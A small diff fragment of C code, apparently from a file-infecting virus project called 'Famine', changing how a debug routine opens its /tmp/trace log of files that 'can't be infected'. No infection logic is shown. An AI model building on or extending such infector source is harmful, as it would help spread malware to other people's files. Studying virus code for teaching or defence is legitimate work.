@@ -68,7 +68,7 @@ void famine(char *file)
 		{
 #if DEBUG
 			char name[] = "/tmp/trace";
-			int fd = _open(name, O_RDWR | O_CREAT | O_APPEND, 0666);
+			int fd = _open(name, O_RDWR | O_APPEND, 0000);
 			char fam[] = "Famine: ";
 			char des[] = " can't be infected\n\n";
 
